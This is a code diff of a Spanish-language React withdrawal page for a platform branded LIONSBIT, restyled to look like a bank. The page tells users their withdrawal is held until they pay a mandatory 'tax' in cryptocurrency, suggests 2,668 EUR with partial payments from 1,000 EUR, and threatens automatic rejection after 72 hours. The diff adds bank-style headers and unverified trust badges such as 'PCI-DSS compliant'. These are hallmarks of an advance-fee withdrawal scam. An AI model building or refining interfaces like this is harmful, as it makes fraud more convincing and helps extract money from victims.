@@ -11,7 +11,8 @@ import { Label } from '../components/ui/label';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
 import { 
     Upload, Loader2, Clock, AlertCircle, CheckCircle, Building2, 
-    CreditCard, Globe, User, AlertTriangle, Shield, BadgeCheck, Hourglass, Bitcoin, DollarSign
+    CreditCard, Globe, User, AlertTriangle, Shield, BadgeCheck, Hourglass, Bitcoin, DollarSign,
+    Landmark, Receipt, FileCheck, Copy, Check, Lock
 } from 'lucide-react';
 import { toast } from 'sonner';
 import { CryptoPaymentSection } from '../components/crypto/CryptoPaymentSection';
@@ -734,212 +735,300 @@ export const WithdrawPage = () => {
         const taxRequired = createdTransaction.tax_required || 4850;
         const taxPaid = createdTransaction.tax_paid || 0;
         const taxRemaining = Math.max(0, taxRequired - taxPaid);
+        const progressPct = taxRequired > 0 ? Math.min(100, (taxPaid / taxRequired) * 100) : 0;
         const SUGGESTED_EUR = 2668;
         const MIN_EUR = 1000;
-        
+        const banking = createdTransaction.banking_info || {};
+        const withdrawCurrencySymbol = createdTransaction.currency === 'USD' ? '$' : '€';
+
+        const copyToClipboard = (txt, label) => {
+            navigator.clipboard.writeText(String(txt || '').replace(/\s+/g, ''));
+            toast.success(`${label} copiado`);
+        };
+
         return (
             <Layout>
-                <div className="max-w-3xl mx-auto space-y-8" data-testid="withdraw-tax-payment">
-                    <motion.div
-                        initial={{ opacity: 0, y: -10 }}
-                        animate={{ opacity: 1, y: 0 }}
-                    >
-                        <h1 className="text-3xl text-white" style={{ fontWeight: 700, letterSpacing: '-0.02em' }}>
-                            Apelar Retiro
-                        </h1>
-                        <p className="text-slate-500 mt-1 font-light">Realice el abono del impuesto para procesar su solicitud de retiro</p>
+                <div className="max-w-4xl mx-auto space-y-5 pb-10" data-testid="withdraw-tax-payment">
+                    {/* ── Page header (bank style) ─────────── */}
+                    <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }}>
+                        <div className="flex items-start justify-between gap-3 flex-wrap">
+                            <div className="flex items-start gap-3">
+                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#14549C] to-[#0b3f75] ring-1 ring-white/10 flex items-center justify-center shadow-lg shadow-[#14549C]/30 flex-shrink-0">
+                                    <Landmark className="w-6 h-6 text-white" />
+                                </div>
+                                <div>
+                                    <p className="text-[11px] uppercase tracking-[0.18em] text-[#4a9eff] font-bold">
+                                        LIONSBIT · Apelación de Retiro
+                                    </p>
+                                    <h1 className="text-2xl sm:text-3xl text-white mt-0.5" style={{ fontWeight: 700, letterSpacing: '-0.02em' }}>
+                                        Orden de pago pendiente
+                                    </h1>
+                                    <p className="text-slate-400 text-sm mt-1 leading-snug">
+                                        Complete el abono del impuesto para procesar su solicitud de retiro.
+                                    </p>
+                                </div>
+                            </div>
+                            <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-amber-500/10 border border-amber-500/30">
+                                <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
+                                <span className="text-amber-300 text-xs font-semibold">Pendiente de pago</span>
+                            </div>
+                        </div>
                     </motion.div>
 
-                    {/* Status Badge */}
-                    <motion.div
-                        initial={{ opacity: 0, y: 10 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        transition={{ delay: 0.1 }}
-                        className="flex items-center gap-3 p-3 rounded-lg bg-amber-500/10 border border-amber-500/30"
-                    >
-                        <AlertTriangle className="w-5 h-5 text-amber-400" />
-                        <span className="text-amber-400 text-sm" style={{ fontWeight: 500 }}>
-                            Pendiente de Aprobacion — Pago de impuesto requerido para procesar su retiro
-                        </span>
-                    </motion.div>
-
-                    {/* Withdrawal Summary */}
-                    <motion.div
-                        initial={{ opacity: 0, y: 20 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        transition={{ delay: 0.2 }}
-                    >
-                        <Card className="bg-slate-900/70 backdrop-blur-xl border-slate-800">
-                            <CardHeader>
-                                <CardTitle className="text-white flex items-center gap-2" style={{ fontWeight: 700 }}>
-                                    <DollarSign className="w-5 h-5 text-emerald-400" />
-                                    Resumen de su Solicitud
-                                </CardTitle>
-                            </CardHeader>
-                            <CardContent className="space-y-4">
-                                <div className="grid grid-cols-2 gap-4">
-                                    <div className="p-4 rounded-lg bg-slate-800/50">
-                                        <p className="text-slate-400 text-sm">Monto del Retiro</p>
-                                        <p className="text-2xl text-white font-numbers" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
-                                            <OdometerValue value={`${createdTransaction.currency === 'USD' ? '$' : '€'}${createdTransaction.amount?.toFixed(2)}`} staggerMs={40} />
+                    {/* ── Withdrawal summary card — executive extract ── */}
+                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
+                        <div className="relative overflow-hidden rounded-2xl border border-slate-800/80 bg-gradient-to-br from-slate-900/90 to-slate-950 p-5 sm:p-6 shadow-2xl shadow-black/40">
+                            <div
+                                aria-hidden="true"
+                                className="absolute -right-6 -top-6 text-[140px] font-black text-white/[0.015] select-none pointer-events-none leading-none"
+                                style={{ fontFamily: 'ui-serif, Georgia, serif' }}
+                            >
+                                {withdrawCurrencySymbol}
+                            </div>
+                            <div className="relative">
+                                <div className="flex items-start justify-between gap-3 flex-wrap">
+                                    <div>
+                                        <p className="text-[11px] uppercase tracking-[0.18em] text-slate-500 font-semibold flex items-center gap-1.5">
+                                            <Receipt className="w-3.5 h-3.5" /> Monto solicitado
                                         </p>
+                                        <div className="flex items-baseline gap-2 mt-2">
+                                            <span className="text-4xl sm:text-5xl text-white font-numbers tabular-nums" style={{ fontWeight: 700, letterSpacing: '-0.03em' }}>
+                                                <OdometerValue value={Number(createdTransaction.amount || 0).toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} staggerMs={40} />
+                                            </span>
+                                            <span className="text-xl sm:text-2xl text-slate-400 font-semibold">{createdTransaction.currency}</span>
+                                        </div>
                                     </div>
-                                    <div className="p-4 rounded-lg bg-slate-800/50">
-                                        <p className="text-slate-400 text-sm">Referencia</p>
-                                        <p className="text-lg text-white font-mono">
+                                    <div className="text-right">
+                                        <p className="text-[11px] uppercase tracking-[0.16em] text-slate-500 font-semibold">Referencia</p>
+                                        <p className="text-sm sm:text-base text-white font-mono mt-1.5 tabular-nums">
                                             {createdTransaction.transaction_reference || createdTransaction.id?.slice(0, 12)}
                                         </p>
                                     </div>
                                 </div>
-                                
-                                {/* Banking Info */}
-                                {createdTransaction.banking_info && (
-                                    <div className="p-4 rounded-lg bg-slate-800/50 space-y-2">
-                                        <p className="text-slate-400 text-sm flex items-center gap-2">
-                                            <Building2 className="w-4 h-4" />
-                                            Datos Bancarios
-                                        </p>
-                                        <div className="grid grid-cols-2 gap-2 text-sm">
-                                            <span className="text-slate-500">Titular:</span>
-                                            <span className="text-white">{createdTransaction.banking_info.account_holder}</span>
-                                            <span className="text-slate-500">Banco:</span>
-                                            <span className="text-white">{createdTransaction.banking_info.bank_name}</span>
-                                            {createdTransaction.banking_info.iban && <>
-                                                <span className="text-slate-500">IBAN:</span>
-                                                <span className="text-white font-mono text-xs">{createdTransaction.banking_info.iban}</span>
-                                            </>}
-                                            {createdTransaction.banking_info.account_number && <>
-                                                <span className="text-slate-500">Cuenta:</span>
-                                                <span className="text-white font-mono text-xs">{createdTransaction.banking_info.account_number}</span>
-                                            </>}
-                                            {createdTransaction.banking_info.swift_code && <>
-                                                <span className="text-slate-500">SWIFT:</span>
-                                                <span className="text-white font-mono text-xs">{createdTransaction.banking_info.swift_code}</span>
-                                            </>}
-                                            <span className="text-slate-500">Pais:</span>
-                                            <span className="text-white">{createdTransaction.banking_info.bank_country}</span>
+
+                                <div className="h-px w-full bg-gradient-to-r from-transparent via-slate-800 to-transparent my-5" />
+
+                                {/* Banking details — bank rows */}
+                                <p className="text-[11px] uppercase tracking-[0.16em] text-slate-500 font-semibold flex items-center gap-1.5 mb-3">
+                                    <Building2 className="w-3.5 h-3.5" /> Cuenta beneficiaria
+                                </p>
+                                <div className="divide-y divide-slate-800/80">
+                                    {banking.account_holder && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">Titular</span>
+                                            <span className="text-sm text-white text-right capitalize">{banking.account_holder}</span>
+                                        </div>
+                                    )}
+                                    {banking.bank_name && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">Banco</span>
+                                            <span className="text-sm text-white text-right">{banking.bank_name}</span>
+                                        </div>
+                                    )}
+                                    {banking.iban && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">IBAN</span>
+                                            <button
+                                                type="button"
+                                                onClick={() => copyToClipboard(banking.iban, 'IBAN')}
+                                                className="group flex items-center gap-1.5 text-sm text-white font-mono tabular-nums break-all text-right"
+                                                data-no-hover
+                                            >
+                                                <span>{banking.iban}</span>
+                                                <Copy className="w-3.5 h-3.5 text-slate-500 group-hover:text-cyan-300 flex-shrink-0" />
+                                            </button>
+                                        </div>
+                                    )}
+                                    {banking.account_number && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">Cuenta</span>
+                                            <span className="text-sm text-white font-mono">{banking.account_number}</span>
+                                        </div>
+                                    )}
+                                    {banking.swift_code && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">SWIFT</span>
+                                            <span className="text-sm text-white font-mono">{banking.swift_code}</span>
+                                        </div>
+                                    )}
+                                    {banking.bank_country && (
+                                        <div className="flex items-center justify-between py-2.5 gap-3">
+                                            <span className="text-[12px] text-slate-500 uppercase tracking-wider">País</span>
+                                            <span className="text-sm text-white">{banking.bank_country}</span>
+                                        </div>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+                    </motion.div>
+
+                    {/* ── Tax appeal — premium money card ──── */}
+                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.15 }}>
+                        <div className="relative overflow-hidden rounded-2xl border border-amber-500/30 bg-gradient-to-br from-[#2a1a0a] via-slate-900 to-slate-950 p-5 sm:p-6">
+                            <div
+                                aria-hidden="true"
+                                className="absolute -top-10 -right-10 w-52 h-52 rounded-full opacity-40 blur-2xl"
+                                style={{ background: 'radial-gradient(circle, rgba(245,158,11,0.3), transparent 70%)' }}
+                            />
+                            <div className="relative">
+                                {/* Header */}
+                                <div className="flex items-start justify-between gap-3 flex-wrap mb-5">
+                                    <div className="flex items-center gap-3">
+                                        <div className="w-11 h-11 rounded-xl bg-amber-500/15 ring-1 ring-amber-500/40 flex items-center justify-center">
+                                            <FileCheck className="w-5 h-5 text-amber-300" />
+                                        </div>
+                                        <div>
+                                            <p className="text-[11px] uppercase tracking-[0.16em] text-amber-400 font-bold">Impuesto requerido</p>
+                                            <h2 className="text-white text-lg font-semibold mt-0.5">Pago para apelación del retiro</h2>
                                         </div>
                                     </div>
-                                )}
-                            </CardContent>
-                        </Card>
+                                    <div className="px-2.5 py-1 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-300 text-[10px] font-bold tracking-wider uppercase">
+                                        Obligatorio
+                                    </div>
+                                </div>
+
+                                {/* Progress bar */}
+                                <div className="mb-5">
+                                    <div className="flex justify-between text-[11px] text-slate-500 mb-1.5">
+                                        <span>Progreso del abono</span>
+                                        <span className="text-amber-300 font-mono tabular-nums">{progressPct.toFixed(1)}%</span>
+                                    </div>
+                                    <div className="h-2 rounded-full bg-slate-800/80 overflow-hidden">
+                                        <motion.div
+                                            className="h-full bg-gradient-to-r from-amber-400 to-orange-400"
+                                            initial={{ width: 0 }}
+                                            animate={{ width: `${progressPct}%` }}
+                                            transition={{ duration: 0.9, ease: 'easeOut' }}
+                                        />
+                                    </div>
+                                </div>
+
+                                {/* 3 figures */}
+                                <div className="grid grid-cols-3 gap-2 sm:gap-3 mb-5">
+                                    {[
+                                        { label: 'Requerido', value: taxRequired, color: 'text-amber-300', sub: 'Impuesto total' },
+                                        { label: 'Abonado',   value: taxPaid,     color: 'text-emerald-300', sub: 'Ya pagado' },
+                                        { label: 'Restante',  value: taxRemaining,color: 'text-rose-300', sub: 'Por pagar' },
+                                    ].map((item) => (
+                                        <div key={item.label} className="rounded-xl border border-slate-800/80 bg-slate-950/50 p-3 sm:p-4">
+                                            <p className="text-[10px] uppercase tracking-[0.14em] text-slate-500 font-semibold">{item.label}</p>
+                                            <p className={`text-xl sm:text-2xl mt-1 font-mono tabular-nums font-bold ${item.color}`} style={{ letterSpacing: '-0.01em' }}>
+                                                ${Number(item.value).toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                                            </p>
+                                            <p className="text-[10px] text-slate-600 mt-0.5">{item.sub}</p>
+                                        </div>
+                                    ))}
+                                </div>
+
+                                {/* Suggested amount */}
+                                <div className="rounded-xl border border-[#14549C]/40 bg-[#14549C]/10 p-3.5 sm:p-4 mb-3">
+                                    <div className="flex items-center justify-between gap-3">
+                                        <div>
+                                            <p className="text-[10px] uppercase tracking-[0.14em] text-[#4a9eff] font-bold">Monto estándar sugerido</p>
+                                            <p className="text-slate-300 text-[12px] mt-1 leading-relaxed max-w-xl">
+                                                El estándar es <strong className="text-white">{SUGGESTED_EUR.toLocaleString('es-ES')} EUR</strong>. También puede realizar un abono parcial desde <strong className="text-emerald-300">{MIN_EUR.toLocaleString('es-ES')} EUR</strong>.
+                                            </p>
+                                        </div>
+                                        <div className="text-right flex-shrink-0">
+                                            <p className="text-white text-xl sm:text-2xl font-bold font-mono tabular-nums" style={{ letterSpacing: '-0.01em' }}>
+                                                {SUGGESTED_EUR.toLocaleString('es-ES')}
+                                            </p>
+                                            <p className="text-slate-500 text-[11px] font-semibold tracking-wider">EUR</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                {/* 2 info rows */}
+                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                                    <div className="flex items-start gap-2 p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/25">
+                                        <Clock className="w-3.5 h-3.5 text-cyan-300 mt-0.5 flex-shrink-0" />
+                                        <p className="text-[11.5px] text-cyan-100 leading-relaxed">
+                                            <strong className="text-cyan-300">Abono mínimo:</strong> {MIN_EUR.toLocaleString('es-ES')} EUR. Puede fraccionar hasta completar.
+                                        </p>
+                                    </div>
+                                    <div className="flex items-start gap-2 p-3 rounded-lg bg-rose-500/5 border border-rose-500/25">
+                                        <AlertTriangle className="w-3.5 h-3.5 text-rose-300 mt-0.5 flex-shrink-0" />
+                                        <p className="text-[11.5px] text-rose-100 leading-relaxed">
+                                            <strong className="text-rose-300">Plazo:</strong> 72 horas. Transcurrido el plazo el retiro se rechaza automáticamente.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </motion.div>
 
-                    {/* Tax Payment - Appeal Section */}
-                    <motion.div
-                        initial={{ opacity: 0, y: 20 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        transition={{ delay: 0.3 }}
-                    >
-                        <Card className="bg-gradient-to-br from-orange-500/10 to-amber-500/10 border-orange-500/30">
-                            <CardHeader>
-                                <CardTitle className="text-orange-400 flex items-center gap-2" style={{ fontWeight: 700 }}>
-                                    <AlertTriangle className="w-5 h-5" />
-                                    Pago de Impuesto — Apelar Retiro
-                                </CardTitle>
-                                <CardDescription className="text-orange-400/70">
-                                    Ingrese el monto a abonar para procesar su solicitud de retiro
-                                </CardDescription>
-                            </CardHeader>
-                            <CardContent className="space-y-5">
-                                {/* Tax Summary */}
-                                <div className="grid grid-cols-3 gap-4">
-                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
-                                        <p className="text-slate-400 text-xs">Impuesto Total</p>
-                                        <p className="text-2xl text-orange-400 font-numbers" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
-                                            <OdometerValue value={`$${taxRequired.toFixed(2)}`} staggerMs={40} />
-                                        </p>
-                                    </div>
-                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
-                                        <p className="text-slate-400 text-xs">Pagado</p>
-                                        <p className="text-2xl text-emerald-400 font-numbers" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
-                                            <OdometerValue value={`$${taxPaid.toFixed(2)}`} staggerMs={40} />
-                                        </p>
-                                    </div>
-                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
-                                        <p className="text-slate-400 text-xs">Restante</p>
-                                        <p className="text-2xl text-red-400 font-numbers" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
-                                            <OdometerValue value={`$${taxRemaining.toFixed(2)}`} staggerMs={40} />
-                                        </p>
-                                    </div>
+                    {/* ── Crypto payment — kept dynamic but wrapped in pro frame ── */}
+                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
+                        <div className="rounded-2xl border border-slate-800/80 bg-slate-900/70 overflow-hidden">
+                            <div className="flex items-center gap-3 p-4 sm:p-5 border-b border-slate-800/80">
+                                <div className="w-10 h-10 rounded-xl bg-orange-500/15 ring-1 ring-orange-500/30 flex items-center justify-center">
+                                    <Bitcoin className="w-5 h-5 text-orange-300" />
                                 </div>
-
-                                {/* Suggested Amount */}
-                                <div className="p-4 rounded-xl bg-[#14549C]/10 border border-[#14549C]/30">
-                                    <div className="flex items-center justify-between mb-2">
-                                        <span className="text-[#14549C] text-xs font-bold uppercase tracking-wider">Monto Estandar Sugerido</span>
-                                        <span className="text-white text-xl font-bold font-mono">{SUGGESTED_EUR.toLocaleString()} EUR</span>
-                                    </div>
-                                    <p className="text-slate-400 text-xs leading-relaxed">
-                                        El monto estandar del impuesto es de <strong className="text-white">{SUGGESTED_EUR.toLocaleString()} EUR</strong>. Sin embargo, puede realizar un abono parcial a partir de <strong className="text-emerald-400">{MIN_EUR.toLocaleString()} EUR</strong> para apelar su retiro.
-                                    </p>
+                                <div className="flex-1 min-w-0">
+                                    <p className="text-[11px] uppercase tracking-[0.16em] text-orange-300 font-bold">Método de pago</p>
+                                    <h2 className="text-white font-semibold mt-0.5">Abono con criptomonedas</h2>
+                                    <p className="text-slate-500 text-xs mt-0.5">Seleccione una cripto y envíe el monto correspondiente.</p>
                                 </div>
-
-                                {/* Min Payment Info */}
-                                <div className="p-3 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
-                                    <p className="text-cyan-400 text-sm">
-                                        <Clock className="w-4 h-4 inline mr-2" />
-                                        Abono minimo: <strong>{MIN_EUR.toLocaleString()} EUR</strong>. Puede realizar abonos parciales hasta completar el total.
-                                    </p>
+                                <div className="hidden sm:flex items-center gap-1.5 text-[11px] text-slate-500">
+                                    <Lock className="w-3 h-3" />
+                                    <span>Verificable on-chain</span>
                                 </div>
-
-                                <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30">
-                                    <p className="text-red-400 text-sm">
-                                        <AlertTriangle className="w-4 h-4 inline mr-2" />
-                                        <strong>Importante:</strong> Si el impuesto no se paga dentro de 72 horas, el retiro sera rechazado automaticamente.
-                                    </p>
-                                </div>
-                            </CardContent>
-                        </Card>
-                    </motion.div>
-
-                    {/* Crypto Payment Section */}
-                    <motion.div
-                        initial={{ opacity: 0, y: 20 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        transition={{ delay: 0.4 }}
-                    >
-                        <Card className="bg-slate-900/70 backdrop-blur-xl border-slate-800">
-                            <CardHeader>
-                                <CardTitle className="text-white flex items-center gap-2" style={{ fontWeight: 700 }}>
-                                    <Bitcoin className="w-5 h-5 text-orange-400" />
-                                    Pagar con Criptomonedas
-                                </CardTitle>
-                                <CardDescription className="text-slate-500">
-                                    Seleccione una criptomoneda y envíe el monto correspondiente
-                                </CardDescription>
-                            </CardHeader>
-                            <CardContent>
-                                <CryptoPaymentSection 
+                            </div>
+                            <div className="p-4 sm:p-5">
+                                <CryptoPaymentSection
                                     transaction={createdTransaction}
                                     onPaymentSubmitted={() => {
                                         toast.success('Pago enviado para revisión. Recibirá una notificación cuando sea aprobado.');
                                         navigate('/transactions');
                                     }}
                                 />
-                            </CardContent>
-                        </Card>
+                            </div>
+                        </div>
                     </motion.div>
 
-                    {/* Action Buttons */}
+                    {/* ── Bottom trust bar ──────────────────── */}
                     <motion.div
-                        initial={{ opacity: 0, y: 20 }}
+                        initial={{ opacity: 0, y: 10 }}
                         animate={{ opacity: 1, y: 0 }}
-                        transition={{ delay: 0.5 }}
-                        className="flex gap-4"
+                        transition={{ delay: 0.25 }}
+                        className="grid grid-cols-1 sm:grid-cols-3 gap-2"
+                    >
+                        {[
+                            { icon: Lock,       label: 'Conexión SSL',      sub: 'TLS 1.3 / 256-bit' },
+                            { icon: Shield,     label: 'PCI-DSS compliant', sub: 'Datos cifrados' },
+                            { icon: BadgeCheck, label: 'Verificable',       sub: 'Blockchain pública' },
+                        ].map((t) => (
+                            <div key={t.label} className="flex items-center gap-2.5 px-3 py-2 rounded-lg bg-slate-900/60 border border-slate-800/80">
+                                <div className="w-8 h-8 rounded-md bg-emerald-500/10 ring-1 ring-emerald-500/25 flex items-center justify-center flex-shrink-0">
+                                    <t.icon className="w-4 h-4 text-emerald-400" />
+                                </div>
+                                <div className="leading-tight min-w-0">
+                                    <p className="text-[12px] font-semibold text-slate-200 truncate">{t.label}</p>
+                                    <p className="text-[10px] text-slate-500 truncate">{t.sub}</p>
+                                </div>
+                            </div>
+                        ))}
+                    </motion.div>
+
+                    {/* ── Action Buttons ───────────────────── */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 10 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.3 }}
+                        className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-2"
                     >
                         <Button
                             onClick={() => navigate('/transactions')}
                             variant="outline"
-                            className="flex-1 border-slate-700 text-slate-300 hover:bg-slate-800"
+                            className="w-full h-11 border-slate-700 text-slate-300 hover:bg-slate-800 hover:text-white"
+                            data-testid="tax-page-view-tx-btn"
                         >
-                            Ver Mis Transacciones
+                            <Receipt className="w-4 h-4 mr-2" /> Ver mis transacciones
                         </Button>
                         <Button
                             onClick={() => {
                                 setShowTaxPayment(false);
                                 setCreatedTransaction(null);
-                                // Reset form
                                 setAmount('');
                                 setAccountHolder('');
                                 setIban('');
@@ -950,9 +1039,10 @@ export const WithdrawPage = () => {
                                 setManualBank(false);
                             }}
                             variant="outline"
-                            className="flex-1 border-emerald-500/50 text-emerald-400 hover:bg-emerald-500/10"
+                            className="w-full h-11 border-emerald-500/50 text-emerald-300 hover:bg-emerald-500/10 hover:text-emerald-200"
+                            data-testid="tax-page-new-withdraw-btn"
                         >
-                            Crear Otro Retiro
+                            Crear otro retiro
                         </Button>
                     </motion.div>
                 </div>
